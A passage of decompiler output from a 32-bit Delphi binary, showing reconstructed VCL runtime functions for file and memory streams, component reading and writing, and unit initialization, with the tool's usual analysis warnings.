  DWORD v11; // [esp-8h] [ebp-20h]
  const ULONG_PTR *v12; // [esp-4h] [ebp-1Ch]
  char v13; // [esp+17h] [ebp-1h]

  if ( System::AnsiString )
    a3 = System::__linkproc__ ClassCreate(a3, System::AnsiString, v9);
  v13 = System::AnsiString;
  v4 = (_DWORD *)a3;
  if ( a4 == 0xFFFF )
  {
    v5 = Sysutils::FileCreate((char *)this);
    v4[1] = v5;
    if ( (int)v5 < 0 )
    {
      LOBYTE(v6) = 1;
      Sysutils::Exception::Exception(dword_40B5D8, v6, off_41DC2C);
      sub_402F98(v9, v10, v11, v12);
    }
  }
  else
  {
    *(_DWORD *)(a3 + 4) = FileOpen((char *)this, a4);
    if ( (int)v4[1] < 0 )
    {
      LOBYTE(v7) = 1;
      Sysutils::Exception::Exception(dword_40B634, v7, off_41DC38[0]);
      sub_402F98(v9, v10, v11, v12);
    }
  }
  if ( v13 )
    sub_402D34(v4);
  return v4;
}
// 40D950: variable 'v9' is possibly undefined
// 40D957: variable 'System::AnsiString' is possibly undefined
// 40D968: variable 'this' is possibly undefined
// 40D990: variable 'v6' is possibly undefined
// 40D995: variable 'v10' is possibly undefined
// 40D995: variable 'v11' is possibly undefined
// 40D995: variable 'v12' is possibly undefined
// 40D9C9: variable 'v7' is possibly undefined
// 40B5D8: using guessed type int dword_40B5D8[4];
// 40B634: using guessed type int dword_40B634[3];
// 41DC2C: using guessed type int **off_41DC2C;
// 41DC38: using guessed type int **off_41DC38[19];

//----- (0040D9F8) --------------------------------------------------------
void __usercall TFileStream::`...'(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v3; // eax
  char v4; // dl
  char v5; // bl
  _DWORD *v6; // esi
  void *v7; // eax

  v3 = sub_402D3C(a1, a2);
  v5 = v4;
  v6 = v3;
  v7 = (void *)v3[1];
  if ( (int)v7 >= 0 )
    sub_407138(v7);
  if ( v5 > 0 )
    sub_402D2C(v6);
}
// 40D9FF: variable 'v4' is possibly undefined

//----- (0040DA20) --------------------------------------------------------
int __usercall sub_40DA20@<eax>(int result@<eax>, int a2@<edx>, int a3@<ecx>)
{
  *(_DWORD *)(result + 4) = a2;
  *(_DWORD *)(result + 8) = a3;
  return result;
}

//----- (0040DA28) --------------------------------------------------------
int __usercall Classes::TCustomMemoryStream::Read@<eax>(Classes::TCustomMemoryStream *this@<ecx>, void *a2@<edx>, _DWORD *a3@<eax>)
{
  int v4; // edi
  int v5; // esi

  v4 = a3[3];
  if ( v4 < 0 )
    return 0;
  if ( (int)this < 0 )
    return 0;
  v5 = a3[2] - v4;
  if ( v5 <= 0 )
    return 0;
  if ( (int)this < v5 )
    v5 = (int)this;
  Move((BYTE *)(v4 + a3[1]), (BYTE *)a2, v5);
  a3[3] += v5;
  return v5;
}

//----- (0040DA60) --------------------------------------------------------
int __usercall TCustomMemoryStream::Seek@<eax>(TCustomMemoryStream *this@<ecx>, int a2@<edx>, int a3@<eax>)
{
  bool v3; // cf
  __int16 v4; // cx

  v3 = (_WORD)this == 0;
  v4 = (_WORD)this - 1;
  if ( v3 )
  {
    *(_DWORD *)(a3 + 12) = a2;
  }
  else if ( v4 )
  {
    if ( v4 == 1 )
      *(_DWORD *)(a3 + 12) = *(_DWORD *)(a3 + 8) + a2;
  }
  else
  {
    *(_DWORD *)(a3 + 12) += a2;
  }
  return *(_DWORD *)(a3 + 12);
}

//----- (0040DA84) --------------------------------------------------------
void __usercall TStored_Destroy_7_0(int self@<eax>)
{
  char v1; // dl
  int *v2; // eax
  char v3; // dl
  char v4; // bl
  int *v5; // esi

  v2 = sub_402D3C((_DWORD *)self, v1);
  v4 = v3;
  v5 = v2;
  sub_40DAB0(v2);
  sub_402BCC(v5, v4 & 0xFC);
  if ( v4 > 0 )
    sub_402D2C(v5);
}
// 40DA86: variable 'v1' is possibly undefined
// 40DA8B: variable 'v3' is possibly undefined

//----- (0040DAB0) --------------------------------------------------------
int __usercall sub_40DAB0@<eax>(int *a1@<eax>)
{
  int result; // eax

  Classes::TMemoryStream::SetCapacity(a1);
  a1[2] = 0;
  result = 0;
  a1[3] = 0;
  return result;
}

//----- (0040DAC8) --------------------------------------------------------
int __usercall sub_40DAC8@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v4; // ebx
  int result; // eax

  sub_40D840(a2);
  v4 = Classes::TStream::GetSize(a2);
  result = (**(int (***)(void))a1)();
  if ( v4 )
    result = TStream::ReadBuffer(a2, *(void **)(a1 + 4), v4);
  return result;
}

//----- (0040DB00) --------------------------------------------------------
void __usercall TMemoryStream_LoadFromFile(void *TMemoryStream_Self@<eax>, void *string_FileName@<edx>)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v4; // [esp-4h] [ebp-Ch]
  _DWORD *v5; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v5 = Classes::TFileStream::TFileStream((Classes::TFileStream *)string_FileName, 1, (int)off_40BD88, 0x20u);
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_40DB48;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  sub_40DAC8((int)TMemoryStream_Self, (int)v5);
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_40DB4F;
  sub_402BDC(v5);
}
// 40BD88: using guessed type int (*off_40BD88[4])();

//----- (0040DB54) --------------------------------------------------------
int __usercall Classes::TMemoryStream::SetCapacity@<eax>(int *a1@<eax>)
{
  int v4; // eax
  int result; // eax
  int v6; // [esp+0h] [ebp-8h]

  v4 = (*(int (**)(void))(*a1 + 16))();
  sub_40DA20((int)a1, v4, a1[2]);
  result = v6;
  a1[4] = v6;
  return result;
}

//----- (0040DB7C) --------------------------------------------------------
int __usercall Classes::TMemoryStream::SetSize@<eax>(int a1@<edx>, int *a2@<eax>)
{
  int v5; // edi
  int result; // eax
  int v7; // ecx

  v5 = a2[3];
  result = Classes::TMemoryStream::SetCapacity(a2);
  a2[2] = a1;
  if ( a1 < v5 )
  {
    LOWORD(v7) = 2;
    result = (*(int (__fastcall **)(int, _DWORD))(*a2 + 12))(v7, 0);
  }
  return result;
}
// 40DBA0: variable 'v7' is possibly undefined

//----- (0040DBA8) --------------------------------------------------------
#error "40DC1F: call analysis failed (funcsize=47)"

//----- (0040DC2C) --------------------------------------------------------
Classes::TMemoryStream *__usercall Classes::TMemoryStream::Write@<eax>(Classes::TMemoryStream *this@<ecx>, const void *a2@<edx>, int *a3@<eax>)
{
  int v6; // eax
  char *v7; // edi

  v6 = a3[3];
  if ( v6 < 0 )
    return 0;
  if ( (int)this < 0 )
    return 0;
  v7 = (char *)this + v6;
  if ( (int)this + v6 <= 0 )
    return 0;
  if ( (int)v7 > a3[2] )
  {
    if ( (int)v7 > a3[4] )
      Classes::TMemoryStream::SetCapacity(a3);
    a3[2] = (int)v7;
  }
  Move((BYTE *)a2, (BYTE *)(a3[3] + a3[1]), (int)this);
  a3[3] = (int)v7;
  return this;
}

//----- (0040DC7C) --------------------------------------------------------
void __usercall Classes::RemoveFixupReferences(const int System::AnsiString@<edx>, int a2@<eax>)
{
  _DWORD *v3; // edi
  int v4; // ebx
  int v5; // eax
  _DWORD *v6; // esi
  unsigned int v7[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v8; // [esp-4h] [ebp-18h]
  _BYTE *v9; // [esp+Ch] [ebp-8h]
  int v10; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v9 = (_BYTE *)System::AnsiString;
  v10 = a2;
  if ( dword_41E624 )
  {
    v3 = (_DWORD *)sub_40C4B0(dword_41E624);
    v8 = &savedregs;
    v7[1] = (unsigned int)&loc_40DD17;
    v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v7);
    v4 = v3[2] - 1;
    if ( v4 >= 0 )
    {
      do
      {
        v5 = Classes::TList::Get(v4, (int)v3);
        v6 = (_DWORD *)v5;
        if ( (!v10 || *(_DWORD *)(v5 + 8) == v10) && (!v9 || Sysutils::SameText(v9, *(_BYTE **)(v5 + 16))) )
        {
          Classes::TList::Delete(v4, v3);
          sub_402BDC(v6);
        }
        --v4;
      }
      while ( v4 != -1 );
    }
    __writefsdword(0, v7[0]);
    v8 = (int *)&loc_40DD1E;
    sub_40C514(dword_41E624);
  }
}
// 41E624: using guessed type int dword_41E624;

//----- (0040DD28) --------------------------------------------------------
void __usercall Classes::RemoveFixups(int a1@<eax>)
{
  _DWORD *v2; // edi
  int v3; // ebx
  _DWORD *v4; // esi
  unsigned int v5[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v6; // [esp-4h] [ebp-14h]
  int v7; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v7 = a1;
  if ( dword_41E624 )
  {
    v2 = (_DWORD *)sub_40C4B0(dword_41E624);
    v6 = &savedregs;
    v5[1] = (unsigned int)&loc_40DD9F;
    v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v5);
    v3 = v2[2] - 1;
    if ( v3 >= 0 )
    {
      do
      {
        v4 = (_DWORD *)Classes::TList::Get(v3, (int)v2);
        if ( v4[1] == v7 )
        {
          Classes::TList::Delete(v3, v2);
          sub_402BDC(v4);
        }
        --v3;
      }
      while ( v3 != -1 );
    }
    __writefsdword(0, v5[0]);
    v6 = (int *)&loc_40DDA6;
    sub_40C514(dword_41E624);
  }
}
// 41E624: using guessed type int dword_41E624;

//----- (0040DDAC) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __fastcall sub_40DDAC(int a1, void *a2)
{
  DWORD v2; // [esp-10h] [ebp-14h]
  DWORD v3; // [esp-Ch] [ebp-10h]
  DWORD v4; // [esp-8h] [ebp-Ch]
  const ULONG_PTR *v5; // [esp-4h] [ebp-8h]

  LOBYTE(a2) = 1;
  Exception_CreateRes_0(dword_40B6E4, a2);
  sub_402F98(v2, v3, v4, v5);
}
// 40DDC3: positive sp value 10 has been found
// 40DDBD: variable 'v2' is possibly undefined
// 40DDBD: variable 'v3' is possibly undefined
// 40DDBD: variable 'v4' is possibly undefined
// 40DDBD: variable 'v5' is possibly undefined
// 40B6E4: using guessed type int dword_40B6E4[3];

//----- (0040DDC4) --------------------------------------------------------
void __fastcall sub_40DDC4(int a1, void *a2)
{
  sub_40DDAC(a1, a2);
}

//----- (0040DDD0) --------------------------------------------------------
void __usercall Classes::TReader::CheckValue(_DWORD *a1@<eax>, char a2@<dl>, int a3@<ecx>)
{
  Classes::TReader *v4; // ecx
  void *v5; // edx
  int v6; // ecx

  if ( a2 != (unsigned __int8)sub_40DF4C(a1, a3) )
  {
    --a1[4];
    Classes::TReader::SkipValue(v4, a1);
    sub_40DDC4(v6, v5);
  }
}
// 40DDE6: variable 'v4' is possibly undefined
// 40DDEB: variable 'v6' is possibly undefined
// 40DDEB: variable 'v5' is possibly undefined

//----- (0040DDF4) --------------------------------------------------------
bool __usercall sub_40DDF4@<al>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  bool result; // al

  result = (unsigned __int8)sub_40DF4C(a1, a2) == 0;
  --a1[4];
  return result;
}

//----- (0040DE08) --------------------------------------------------------
__int64 __usercall sub_40DE08@<edx:eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  __int64 result; // rax

  result = sub_40DF4C(a1, a2);
  --a1[4];
  return result;
}

//----- (0040DE18) --------------------------------------------------------
_DWORD *__usercall TReader::Read@<eax>(TReader *this@<ecx>, void *a2@<edx>, _DWORD *result@<eax>)
{
  _DWORD *v5; // esi
  unsigned int v6; // ecx
  bool v7; // cc
  unsigned int v8; // ecx
  char v9; // dl
  unsigned int v10; // ecx
  char *v11; // edi
  char *v12; // esi
  int v13; // ecx
  _DWORD *v14; // [esp-4h] [ebp-10h]

  v5 = result;
  while ( this )
  {
    v6 = v5[5];
    v7 = v6 <= v5[4];
    v8 = v6 - v5[4];
    if ( v7 )
    {
      Classes::TReader::ReadBuffer((int)v5);
      v8 = v5[5];
    }
    if ( v8 >= (unsigned int)this )
      v8 = (unsigned int)this;
    v14 = v5;
    this = (TReader *)((char *)this - v8);
    result = (_DWORD *)(v5[4] + v5[2]);
    v5[4] += v8;
    v9 = v8;
    v10 = v8 >> 2;
    qmemcpy(a2, result, 4 * v10);
    v12 = (char *)&result[v10];
    v11 = (char *)a2 + 4 * v10;
    v13 = v9 & 3;
    qmemcpy(v11, v12, v13);
    a2 = &v11[v13];
    v5 = v14;
  }
  return result;
}

//----- (0040DE64) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall Classes::TReader::ReadBuffer@<eax>(int a1@<eax>)
{
  int v3; // eax
  void *v4; // edx
  int result; // eax
  DWORD v6; // [esp-10h] [ebp-18h]
  DWORD v7; // [esp-Ch] [ebp-14h]
  DWORD v8; // [esp-8h] [ebp-10h]
  const ULONG_PTR *v9; // [esp-4h] [ebp-Ch]

  v3 = (*(int (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(a1 + 4) + 4))(*(_DWORD *)(a1 + 12), *(_DWORD *)(a1 + 8));
  *(_DWORD *)(a1 + 20) = v3;
  if ( !v3 )
  {
    LOBYTE(v4) = 1;
    Exception_CreateRes_0(dword_40B6E4, v4);
    sub_402F98(v6, v7, v8, v9);
  }
  result = 0;
  *(_DWORD *)(a1 + 16) = 0;
  return result;
}
// 40DE9D: positive sp value 10 has been found
// 40DE8C: variable 'v4' is possibly undefined
// 40DE91: variable 'v6' is possibly undefined
// 40DE91: variable 'v7' is possibly undefined
// 40DE91: variable 'v8' is possibly undefined
// 40DE91: variable 'v9' is possibly undefined
// 40B6E4: using guessed type int dword_40B6E4[3];

//----- (0040DEA0) --------------------------------------------------------
void __usercall sub_40DEA0(_DWORD *a1@<eax>, int a2@<ecx>)
{
  Classes::TReader::CheckValue(a1, 1, a2);
}

//----- (0040DEA8) --------------------------------------------------------
void __usercall sub_40DEA8(void *this@<ecx>, _DWORD *a2@<eax>)
{
  Classes::TReader::CheckValue(a2, 0, (int)this);
}

//----- (0040DEB0) --------------------------------------------------------
_DWORD *__usercall TReader::ReadStr@<eax>(TReader *this@<ecx>, _DWORD *a2@<eax>, BYTE **a3@<edx>)
{
  char *v5; // eax
  TReader *v7; // [esp+0h] [ebp-Ch] BYREF

  v7 = this;
  TReader::Read((TReader *)1, &v7, a2);
  __linkproc__ LStrFromPCharLen(a3, 0, (unsigned __int8)v7);
  v5 = UniqueString((char **)a3);
  return TReader::Read((TReader *)(unsigned __int8)v7, v5, a2);
}

//----- (0040DEEC) --------------------------------------------------------
_DWORD *__usercall TReader::ReadString@<eax>(TReader *this@<ecx>, _DWORD *a2@<eax>, BYTE **a3@<edx>)
{
  int v5; // ecx
  __int64 v6; // rax
  TReader *v8[3]; // [esp+0h] [ebp-Ch] BYREF

  v8[0] = 0;
  v6 = sub_40DF4C(a2, (int)this);
  LOBYTE(v6) = v6 - 6;
  if ( (_BYTE)v6 )
  {
    if ( (_BYTE)v6 == 6 )
      TReader::Read((TReader *)4, v8, a2);
    else
      sub_40DDC4(v5, (void *)HIDWORD(v6));
  }
  else
  {
    TReader::Read((TReader *)1, v8, a2);
  }
  __linkproc__ LStrFromPCharLen(a3, 0, (int)v8[0]);
  return TReader::Read(v8[0], *a3, a2);
}
// 40DF29: variable 'v5' is possibly undefined

//----- (0040DF4C) --------------------------------------------------------
__int64 __usercall sub_40DF4C@<edx:eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  __int64 result; // rax
  int v3; // [esp+0h] [ebp-4h] BYREF

  v3 = a2;
  LODWORD(result) = TReader::Read((TReader *)1, &v3, a1);
  LOBYTE(result) = v3;
  HIDWORD(result) = v3;
  return result;
}

//----- (0040DF60) --------------------------------------------------------
void __usercall Classes::TReader::SkipSetBody(Classes::TReader *this@<ecx>, _DWORD *a2@<eax>)
{
  LStr *v3; // ecx
  unsigned int v4[2]; // [esp-10h] [ebp-14h] BYREF
  LStr *v5; // [esp-8h] [ebp-Ch]
  BYTE *v6; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v6 = 0;
  v5 = (LStr *)&savedregs;
  v4[1] = (unsigned int)&loc_40DF9C;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  do
    TReader::ReadStr(this, a2, &v6);
  while ( v6 );
  v3 = v5;
  __writefsdword(0, v4[0]);
  v5 = (LStr *)&loc_40DFA3;
  System::__linkproc__ LStrClr(v3);
}
// 40DF7B: variable 'this' is possibly undefined

//----- (0040DFA8) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
void __cdecl Classes::_17116(int a1)
{
  int v1; // ecx
  _DWORD **i; // ebx
  Classes::TReader *v3; // ecx

  for ( i = (_DWORD **)(a1 - 4); !sub_40DDF4(*i, v1); Classes::TReader::SkipValue(v3, *i) )
    ;
  sub_40DEA8(v3, *i);
}
// 40DFB6: variable 'v3' is possibly undefined
// 40DFBD: variable 'v1' is possibly undefined

//----- (0040DFD0) --------------------------------------------------------
// Borland Visual Component Library & Packages
int __usercall Classes::_16873@<eax>(int result@<eax>, int a2)
{
  int v4; // ebx
  char v5[256]; // [esp+4h] [ebp-100h] BYREF

  v4 = result;
  while ( v4 > 0 )
  {
    if ( v4 <= 256 )
    {
      result = (int)TReader::Read((TReader *)v4, v5, *(_DWORD **)(a2 - 4));
      v4 = 0;
    }
    else
    {
      result = (int)TReader::Read((TReader *)0x100, v5, *(_DWORD **)(a2 - 4));
      v4 -= 256;
    }
  }
  return result;
}

//----- (0040E024) --------------------------------------------------------
// Borland Visual Component Library & Packages
int __cdecl Classes::_16874(int a1)
{
  int v1; // ecx
  int v3; // [esp+0h] [ebp-4h] BYREF

  v3 = v1;
  TReader::Read((TReader *)4, &v3, *(_DWORD **)(a1 - 4));
  return Classes::_16873(v3, a1);
}
// 40E027: variable 'v1' is possibly undefined

//----- (0040E04C) --------------------------------------------------------
void __cdecl Classes::_16875(int a1)
{
  int v1; // ecx
  _DWORD **i; // ebx
  Classes::TReader *v3; // ecx
  int v4; // ecx
  void *v5; // ecx
  void *v6; // ecx
  int v7; // [esp-4h] [ebp-8h]

  for ( i = (_DWORD **)(a1 - 4); !sub_40DDF4(*i, v1); sub_40DEA8(v5, *i) )
  {
    if ( (unsigned __int8)(sub_40DE08(*i, (int)v6) - 2) < 3u )
      Classes::TReader::SkipValue(v3, *i);
    Classes::_16873(1, a1);
    v4 = v7;
    while ( !sub_40DDF4(*i, v4) )
      Classes::TReader::SkipProperty((Classes::TReader *)v5, *i);
  }
  sub_40DEA8(v6, *i);
}
// 40E05A: variable 'v6' is possibly undefined
// 40E067: variable 'v3' is possibly undefined
// 40E07A: variable 'v7' is possibly undefined
// 40E07F: variable 'v5' is possibly undefined
// 40E086: variable 'v4' is possibly undefined
// 40E098: variable 'v1' is possibly undefined

//----- (0040E0AC) --------------------------------------------------------
void __usercall Classes::TReader::SkipValue(Classes::TReader *this@<ecx>, _DWORD *a2@<eax>)
{
  TReader *v2; // ecx
  LStr *v3; // ecx
  unsigned int v4[2]; // [esp-Ch] [ebp-14h] BYREF
  LStr *v5; // [esp-4h] [ebp-Ch]
  BYTE *v6; // [esp+0h] [ebp-8h] BYREF
  _DWORD *v7; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v6 = 0;
  v7 = a2;
  v5 = (LStr *)&savedregs;
  v4[1] = (unsigned int)&loc_40E209;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  switch ( sub_40DF4C(a2, (int)this) & 0x7F )
  {
    case 1i64:
      Classes::_17116((int)&savedregs);
      break;
    case 2i64:
      Classes::_16873(1, (int)&savedregs);
      break;
    case 3i64:
      Classes::_16873(2, (int)&savedregs);
      break;
    case 4i64:
    case 0xFi64:
      Classes::_16873(4, (int)&savedregs);
      break;
    case 5i64:
      Classes::_16873(10, (int)&savedregs);
      break;
    case 6i64:
    case 7i64:
      TReader::ReadStr(v2, v7, &v6);
      break;
    case 0xAi64:
    case 0xCi64:
    case 0x12i64:
      Classes::_16874((int)&savedregs);
      break;
    case 0xBi64:
      Classes::TReader::SkipSetBody(v2, v7);
      break;
    case 0xEi64:
      Classes::_16875((int)&savedregs);
      break;
    case 0x10i64:
    case 0x11i64:
    case 0x13i64:
      Classes::_16873(8, (int)&savedregs);
      break;
    default:
      break;
  }
  v3 = v5;
  __writefsdword(0, v4[0]);
  v5 = (LStr *)&loc_40E210;
  System::__linkproc__ LStrClr(v3);
}
// 40E188: variable 'v2' is possibly undefined

//----- (0040E214) --------------------------------------------------------
void __usercall Classes::TReader::SkipProperty(Classes::TReader *this@<ecx>, _DWORD *a2@<eax>)
{
  Classes::TReader *v3; // ecx
  LStr *v4; // ecx
  unsigned int v5[2]; // [esp-10h] [ebp-14h] BYREF
  LStr *v6; // [esp-8h] [ebp-Ch]
  BYTE *v7; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v7 = 0;
  v6 = (LStr *)&savedregs;
  v5[1] = (unsigned int)&loc_40E251;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  TReader::ReadStr(this, a2, &v7);
  Classes::TReader::SkipValue(v3, a2);
  v4 = v6;
  __writefsdword(0, v5[0]);
  v6 = (LStr *)&loc_40E258;
  System::__linkproc__ LStrClr(v4);
}
// 40E236: variable 'v3' is possibly undefined

//----- (0040E25C) --------------------------------------------------------
_DWORD *__usercall TWriter::Write@<eax>(TWriter *this@<ecx>, const void *a2@<edx>, _DWORD *result@<eax>)
{
  _DWORD *v5; // edi
  unsigned int v6; // ecx
  bool v7; // cc
  unsigned int v8; // ecx
  char v9; // dl
  unsigned int v10; // ecx
  char *v11; // edi
  char *v12; // esi
  int v13; // ecx
  _DWORD *v14; // [esp-4h] [ebp-10h]

  v5 = result;
  while ( this )
  {
    v6 = v5[3];
    v7 = v6 <= v5[4];
    v8 = v6 - v5[4];
    if ( v7 )
    {
      sub_40E2A8((int)v5);
      v8 = v5[3];
    }
    if ( v8 >= (unsigned int)this )
      v8 = (unsigned int)this;
    this = (TWriter *)((char *)this - v8);
    v14 = v5;
    result = (_DWORD *)(v5[4] + v5[2]);
    v5[4] += v8;
    v9 = v8;
    v10 = v8 >> 2;
    qmemcpy(result, a2, 4 * v10);
    v12 = (char *)a2 + 4 * v10;
    v11 = (char *)&result[v10];
    v13 = v9 & 3;
    qmemcpy(v11, v12, v13);
    a2 = &v12[v13];
    v5 = v14;
  }
  return result;
}

//----- (0040E2A8) --------------------------------------------------------
int __usercall sub_40E2A8@<eax>(int a1@<eax>)
{
  int result; // eax

  Classes::TStream::WriteBuffer(*(Classes::TStream **)(a1 + 16), *(const void **)(a1 + 8), *(_DWORD *)(a1 + 4));
  result = 0;
  *(_DWORD *)(a1 + 16) = 0;
  return result;
}

//----- (0040E2C0) --------------------------------------------------------
_DWORD *__usercall sub_40E2C0@<eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  return sub_40E32C(a1, 1, a2);
}

//----- (0040E2C8) --------------------------------------------------------
_DWORD *__usercall sub_40E2C8@<eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  return sub_40E32C(a1, 0, a2);
}

//----- (0040E2D0) --------------------------------------------------------
_DWORD *__usercall TWriter::WriteString@<eax>(void *a1@<edx>, _DWORD *a2@<eax>)
{
  int v5; // ecx
  TWriter *v7[3]; // [esp+0h] [ebp-Ch] BYREF

  v7[0] = (TWriter *)sub_403724((int)a1);
  if ( (int)v7[0] > 255 )
  {
    sub_40E32C(a2, 12, v5);
    TWriter::Write((TWriter *)4, v7, a2);
  }
  else
  {
    sub_40E32C(a2, 6, v5);
    TWriter::Write((TWriter *)1, v7, a2);
  }
  return TWriter::Write(v7[0], a1, a2);
}
// 40E2EE: variable 'v5' is possibly undefined

//----- (0040E32C) --------------------------------------------------------
_DWORD *__usercall sub_40E32C@<eax>(_DWORD *a1@<eax>, char a2@<dl>, int a3@<ecx>)
{
  int v4; // [esp+0h] [ebp-4h] BYREF

  v4 = a3;
  LOBYTE(v4) = a2;
  return TWriter::Write((TWriter *)1, &v4, a1);
}

//----- (0040E340) --------------------------------------------------------
int sub_40E340()
{
  int result; // eax

  if ( hWnd )
  {
    DestroyWindow(hWnd);
    result = 0;
    hWnd = 0;
  }
  return result;
}

//----- (0040E35C) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
_DWORD *Classes::_17428()
{
  int v0; // edi
  int v1; // ebx
  int v2; // esi
  _DWORD *v3; // eax
  unsigned int v5[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v6; // [esp-4h] [ebp-10h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v0 = sub_40C4B0(dword_41E620);
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_40E3B1;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  if ( *(_DWORD *)(v0 + 8) - 1 >= 0 )
  {
    v1 = *(_DWORD *)(v0 + 8);
    v2 = 0;
    do
    {
      v3 = (_DWORD *)Classes::TList::Get(v2, v0);
      sub_402BDC(v3);
      ++v2;
      --v1;
    }
    while ( v1 );
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_40E3B8;
  sub_40C514(dword_41E620);
  return sub_402BDC((_DWORD *)dword_41E620);
}
// 41E620: using guessed type int dword_41E620;

//----- (0040E3C8) --------------------------------------------------------
// attributes: thunk
void __usercall sub_40E3C8(void *a1@<eax>)
{
  Classes::UnRegisterModuleClasses(a1);
}

//----- (0040E3D0) --------------------------------------------------------
int sub_40E3D0()
{
  _DWORD **v0; // eax
  int result; // eax
  unsigned int v2[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v2[2] = (unsigned int)&savedregs;
  v2[1] = (unsigned int)&loc_40E47C;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( !++dword_41E614 )
  {
    Classes::UnRegisterModuleClasses(hInst);
    Sysutils::TMultiReadExclusiveWriteSynchronizer::BeginWrite(dword_41E610);
    Classes::_17428();
    sub_402BDC((_DWORD *)dword_41E618);
    sub_402BDC((_DWORD *)dword_41E61C);
    Classes::RemoveFixupReferences(0, 0);
    sub_402BDC((_DWORD *)dword_41E624);
    dword_41E624 = 0;
    v0 = (_DWORD **)__linkproc__ GetTls();
    sub_402BDC(v0[2]);
    sub_40E340();
    sub_402BDC((_DWORD *)dword_41E610);
    dword_41E610 = 0;
    sub_404A1C((int)sub_40E3C8);
    DeleteCriticalSection_0(&stru_41E628);
  }
  result = 0;
  __writefsdword(0, v2[0]);
  return result;
}
// 41E610: using guessed type int dword_41E610;
// 41E614: using guessed type int dword_41E614;
// 41E618: using guessed type int dword_41E618;
// 41E61C: using guessed type int dword_41E61C;
// 41E624: using guessed type int dword_41E624;

//----- (0040E488) --------------------------------------------------------
void __cdecl Classes::initialization()
{
  int v1; // eax

  if ( dword_41E614-- == 0 )
  {
    InitializeCriticalSection_0(&stru_41E628);
    sub_404A14((int)sub_40E3C8);
    dword_41E610 = (int)TMultiReadExclusiveWriteSynchronizer__bctr((char *)dword_406C68, 1);
    dword_41E618 = (int)Classes::TThreadList::TThreadList((char *)dword_40B96C, 1);
    TObject_Create(&off_40BBB4);
    dword_41E61C = v1;
    dword_41E620 = (int)Classes::TThreadList::TThreadList((char *)dword_40B96C, 1);
    dword_41E624 = (int)Classes::TThreadList::TThreadList((char *)dword_40B96C, 1);
  }
}
// 40E4D3: variable 'v1' is possibly undefined
// 406C68: using guessed type int dword_406C68[2];
// 40B96C: using guessed type int dword_40B96C[3];
// 40BBB4: using guessed type void *off_40BBB4;
// 41E610: using guessed type int dword_41E610;
// 41E614: using guessed type int dword_41E614;
// 41E618: using guessed type int dword_41E618;
// 41E61C: using guessed type int dword_41E61C;
// 41E620: using guessed type int dword_41E620;
// 41E624: using guessed type int dword_41E624;

//----- (0040E514) --------------------------------------------------------
int Cxfilter::Finalization()
{
  int result; // eax
  unsigned int v2[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v2[2] = (unsigned int)&savedregs;
  v2[1] = (unsigned int)&loc_40E550;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( !++dword_41E644 )
    System::__linkproc__ FinalizeArray((OLECHAR **)&off_41C2F0, (char *)dword_401004, 2);
  result = 0;
  __writefsdword(0, v2[0]);
  return result;
}
// 401004: using guessed type int dword_401004[2];
// 41C2F0: using guessed type int (*off_41C2F0)[4];
// 41E644: using guessed type int dword_41E644;

//----- (0040E55C) --------------------------------------------------------
void sub_40E55C()
{
  --dword_41E644;
}
// 41E644: using guessed type int dword_41E644;

//----- (0040E62C) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_40E62C@<eax>(DWORD a1@<eax>, void *a2@<edx>)
{
  int result; // eax
  DWORD v4; // [esp-Ch] [ebp-18h]
  DWORD v5; // [esp-8h] [ebp-14h]
  const ULONG_PTR *v6; // [esp-4h] [ebp-10h]

  LOBYTE(v4) = 11;
  LOBYTE(a2) = 1;
  Sysutils::Exception::Exception(dword_40E5B0, a2, off_41DB70[0]);
